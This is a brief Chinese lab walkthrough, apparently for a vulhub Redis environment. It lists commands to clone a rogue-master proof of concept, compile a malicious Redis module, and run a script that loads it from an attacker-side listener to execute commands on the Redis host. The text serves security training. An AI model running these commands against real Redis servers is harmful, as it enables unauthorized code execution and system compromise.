开启环境：
```
docker compose up -d
```

首先下载POC：
```
git clone https://github.com/vulhub/redis-rogue-getshell.git
```
需要在Linux/amd64环境内而不是在mac里
macos里没有redis-cli
所以使用容器里的：
```
cd /RedisModulesSDK
docker run --rm --platform linux/amd64 \ -v "$PWD":/build -w /build \ -e http_proxy= -e https_proxy= -e HTTP_PROXY= -e HTTPS_PROXY= \ gcc:9 bash -c 'apt-get install -y make && make'
```
使用脚本：
```
python3 redis-master.py -r 127.0.0.1 -p 6379 -L 192.168.139.3 -P 8888 -f RedisModulesSDK/exp/exp.so -c 'id'
```
即可执行id命令

